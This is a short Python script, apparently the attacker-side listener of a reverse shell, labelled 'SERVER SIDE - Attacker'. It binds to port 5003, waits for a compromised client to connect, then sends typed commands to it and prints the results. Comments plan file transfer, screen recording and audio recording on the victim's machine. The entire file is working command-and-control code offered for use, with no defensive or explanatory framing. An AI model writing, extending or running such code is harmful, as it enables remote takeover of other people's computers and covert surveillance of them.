import socket

# IMPROVEMENTS

# Add download and upload commands: Transfer files with socket
# Custom command to record screen and download the video
# Command to record audio

# SERVER SIDE - Attacker

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

client = socket.socket()
client.bind((SERVER_HOST, SERVER_PORT))

client.listen(5)
print(f"Listening at {SERVER_HOST}:{SERVER_PORT}")

client_socket, client_address = client.accept()
print(f"[CONNECTED] {client_address[0]}:{client_address[1]}")

cwd = client_socket.recv(BUFFER_SIZE).decode()

while True:
    command = input(f"{cwd} ···> ")

    if not command.strip():
        continue

    client_socket.send(command.encode())

    if command.lower() == "exit":
        break

    output = client_socket.recv(BUFFER_SIZE).decode()
    results, cwd = output.split(SEPARATOR)

    print(results)